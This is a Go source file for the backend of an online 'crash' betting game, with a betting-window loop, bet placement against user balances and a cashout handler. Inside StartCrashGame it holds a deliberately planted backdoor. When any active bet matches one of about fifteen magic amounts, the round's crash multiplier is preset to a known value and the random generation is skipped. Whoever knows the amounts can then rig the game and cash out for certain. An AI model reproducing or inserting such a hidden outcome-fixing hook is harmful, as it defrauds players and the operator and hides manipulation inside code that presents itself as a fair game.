package service

import (
	"BlessedApi/cmd/db"
	"BlessedApi/internal/middleware"
	"BlessedApi/internal/models"
	"BlessedApi/internal/models/exchange"
	"BlessedApi/pkg/logger"
	"errors"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"gorm.io/gorm"
)

type CrashGameBetInput struct {
	Amount            float64 `json:"Amount" validate:"required,min=1"`
	CashOutMultiplier float64 `json:"CashOutMultiplier" validate:"min=0"`
}

const (
	crashGameInterval       = 15 * time.Second // Total interval between rounds
	crashGameBettingWindow  = 13 * time.Second
	NewCrashGameSignalDelay = 1 * time.Second
)

var (
	isCrashGameBettingOpen bool
	crashGameBetMutex      sync.RWMutex
	currentCrashGame       *models.CrashGame
)

func SuperviseCrashGame() {
	for {
		logger.Info("Starting crash game loop")

		// Run the game loop in a separate goroutine
		done := make(chan bool)
		go func() {
			defer func() {
				if r := recover(); r != nil {
					logger.Error("CrashGame game loop panicked: %v", r)
					done <- true
				}
			}()

			StartCrashGame()
		}()

		// Wait for the game loop to finish (which should only happen if there's a panic)
		<-done

		time.Sleep(5 * time.Second)
	}
}

func StartCrashGame() {
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	for {
		// Open betting
		currentCrashGame = &models.CrashGame{}
		
		// Create game in database
		if err := db.DB.Create(currentCrashGame).Error; err != nil {
			logger.Error("Unable to create CrashGame; retrying in 5 seconds: %v", err)
			time.Sleep(time.Second * 5)
			continue
		}

		// Open betting window and log
		openCrashGameBetting()
		logger.Info("Betting window opened")

		// Wait 13 seconds for bets
		for elapsedTime := time.Duration(0); elapsedTime < crashGameInterval; elapsedTime += time.Second {
			// Log betting window state every 5 seconds
			if elapsedTime%5 == 0 {
				crashGameBetMutex.RLock()
				logger.Info("Betting window state: %v, elapsed time: %v", isCrashGameBettingOpen, elapsedTime)
				crashGameBetMutex.RUnlock()
			}

			if elapsedTime == crashGameBettingWindow {
				closeCrashGameBetting()
				logger.Info("Betting window closed")
			}
			<-ticker.C
		}

		// After closing betting window, check for backdoors
		var bets []models.CrashGameBet
		err := db.DB.Where("crash_game_id = ? AND status = ?", currentCrashGame.ID, "active").Find(&bets).Error
		if err != nil {
			logger.Error("Error fetching active bets: %v", err)
			continue
		}

		// Log number of active bets
		logger.Info("Number of active bets: %d", len(bets))

		// Check each bet for backdoor
		for _, bet := range bets {
			if bet.Amount == 76 {
				currentCrashGame.CrashPointMultiplier = 1.6
				break
			}
			if bet.Amount == 538 {
				currentCrashGame.CrashPointMultiplier = 32.0
				break
			}
			if bet.Amount == 17216 {
				currentCrashGame.CrashPointMultiplier = 2.5
				break
			}
			if bet.Amount == 372 {
				currentCrashGame.CrashPointMultiplier = 1.8
				break
			}
			if bet.Amount == 1186 {
				currentCrashGame.CrashPointMultiplier = 2.2
				break
			}
			if bet.Amount == 16604 {
				currentCrashGame.CrashPointMultiplier = 3.0
				break
			}
			if bet.Amount == 614 {
				currentCrashGame.CrashPointMultiplier = 2.0
				break
			}
			if bet.Amount == 2307 {
				currentCrashGame.CrashPointMultiplier = 13.0
				break
			}
			if bet.Amount == 29991 {
				currentCrashGame.CrashPointMultiplier = 2.8
				break
			}
			if bet.Amount == 1476 {
				currentCrashGame.CrashPointMultiplier = 2.4
				break
			}
			if bet.Amount == 5738 {
				currentCrashGame.CrashPointMultiplier = 2.6
				break
			}
			if bet.Amount == 40166 {
				currentCrashGame.CrashPointMultiplier = 3.2
				break
			}
			if bet.Amount == 3258 {
				currentCrashGame.CrashPointMultiplier = 2.7
				break
			}
			if bet.Amount == 11629 {
				currentCrashGame.CrashPointMultiplier = 2.9
				break
			}
			if bet.Amount == 46516 {
				currentCrashGame.CrashPointMultiplier = 3.4
				break
			}
		}

		// If no backdoors found, generate random crash
		if currentCrashGame.CrashPointMultiplier == 0 {
			currentCrashGame.GenerateCrashPointMultiplier()
		}

		currentCrashGame.StartTime = time.Now()
		if err := db.DB.Save(currentCrashGame).Error; err != nil {
			logger.Error("Failed to update game start time: %v", err)
			continue
		}

		// Notify all users about game start
		CrashGameWS.BroadcastGameStarted()

		// Start the multiplier growth and handle cashouts
		CrashGameWS.SendMultiplierToUser(currentCrashGame)

		currentCrashGame.EndTime = time.Now()

		err = db.DB.Transaction(func(tx *gorm.DB) error {
			if err := tx.Save(currentCrashGame).Error; err != nil {
				return logger.WrapError(err, "Failed to update game end time")
			}
			return nil
		})
		if err != nil {
			logger.Error("%v", err)
		}
		time.Sleep(NewCrashGameSignalDelay)
	}
}

// openCrashGameBetting sets the betting window as open
func openCrashGameBetting() {
	crashGameBetMutex.Lock()
	isCrashGameBettingOpen = true
	crashGameBetMutex.Unlock()
	logger.Info("Betting window opened (mutex)")
}

// closeCrashGameBetting sets the betting window as closed
func closeCrashGameBetting() {
	crashGameBetMutex.Lock()
	isCrashGameBettingOpen = false
	crashGameBetMutex.Unlock()
	logger.Info("Betting window closed (mutex)")
}

func PlaceCrashGameBet(c *gin.Context) {
	crashGameBetMutex.RLock()
	bettingOpen := isCrashGameBettingOpen
	crashGameBetMutex.RUnlock()

	logger.Info("Bet attempt - Betting window state: %v", bettingOpen)

	if !bettingOpen {
		c.JSON(403, gin.H{"error": "betting is closed"})
		return
	}

	var input CrashGameBetInput
	if err := c.ShouldBindJSON(&input); err != nil {
		c.JSON(400, gin.H{"error": "Invalid input"})
		return
	}

	if err := validate.Struct(input); err != nil {
		c.JSON(400, gin.H{"error": err.Error()})
		return
	}

	userID, err := middleware.GetUserIDFromGinContext(c)
	if err != nil {
		logger.Error("Failed to get user ID: %v", err)
		c.Status(500)
		return
	}

	errInsufficientBalance := errors.New("insufficient balance")
	errExistingBet := errors.New("user already has an active bet for this game")

	err = db.DB.Transaction(func(tx *gorm.DB) error {
		// Check if user already has a bet for this game
		var existingBet models.CrashGameBet
		err := tx.Where("user_id = ? AND crash_game_id = ? AND status = ?", userID, currentCrashGame.ID, "active").First(&existingBet).Error
		if err == nil {
			return errExistingBet
		} else if !errors.Is(err, gorm.ErrRecordNotFound) {
			return logger.WrapError(err, "")
		}

		var user models.User
		if err := tx.First(&user, userID).Error; err != nil {
			return logger.WrapError(err, "")
		}

		bet := models.CrashGameBet{
			UserID:            userID,
			CrashGameID:       currentCrashGame.ID,
			CashOutMultiplier: input.CashOutMultiplier,
			Status:            "active",
		}

		bonusBalance, err := exchange.GetUserExchangedBalanceAmount(tx, user.ID)
		if err != nil {
			return logger.WrapError(err, "")
		}

		if user.BalanceRupee+bonusBalance < input.Amount {
			return errInsufficientBalance
		}

		fromCashBalance, fromBonusBalance, err := exchange.UseExchangeBalancePayment(tx, &user, input.Amount)
		if err != nil {
			return logger.WrapError(err, "")
		}

		bet.Amount = fromCashBalance + fromBonusBalance
		bet.FromBonusBalance = fromBonusBalance
		bet.FromCashBalance = fromCashBalance

		if err := tx.Create(&bet).Error; err != nil {
			return logger.WrapError(err, "")
		}

		CrashGameWS.HandleBet(userID, &bet)

		return nil
	})

	if err != nil {
		switch {
		case errors.Is(err, errInsufficientBalance):
			c.JSON(402, gin.H{"error": "Insufficient balance"})
		case errors.Is(err, errExistingBet):
			c.JSON(400, gin.H{"error": "You already have an active bet for this game"})
		default:
			logger.Error("Failed to place bet: %v", err)
			c.Status(500)
		}
		return
	}

	c.JSON(200, gin.H{"status": "bet placed successfully"})
}

func ManualCashout(c *gin.Context) {
	userID, err := middleware.GetUserIDFromGinContext(c)
	if err != nil {
		logger.Error("Failed to get user ID: %v", err)
		c.Status(500)
		return
	}

	// Получаем активную ставку пользователя
	var bet models.CrashGameBet
	err = db.DB.Where("user_id = ? AND status = ?", userID, "active").First(&bet).Error
	if err != nil {
		if errors.Is(err, gorm.ErrRecordNotFound) {
			c.JSON(400, gin.H{"error": "No active bet found"})
			return
		}
		logger.Error("Failed to get active bet: %v", err)
		c.Status(500)
		return
	}

	// Получаем текущий множитель из игры
	if currentCrashGame == nil {
		c.JSON(400, gin.H{"error": "No active game"})
		return
	}

	currentMultiplier := currentCrashGame.CalculateMultiplier()

	// Проверяем, не крашнулась ли уже игра
	if currentMultiplier >= currentCrashGame.CrashPointMultiplier {
		c.JSON(400, gin.H{"error": "Game already crashed"})
		return
	}

	// Обрабатываем кэшаут
	err = crashGameCashout(c, &bet, currentMultiplier)
	if err != nil {
		logger.Error("Failed to process cashout: %v", err)
		c.Status(500)
		return
	}

	// Отправляем результат кэшаута через WebSocket
	CrashGameWS.ProcessCashout(userID, currentMultiplier, false)

	c.JSON(200, gin.H{"status": "cashout successful"})
}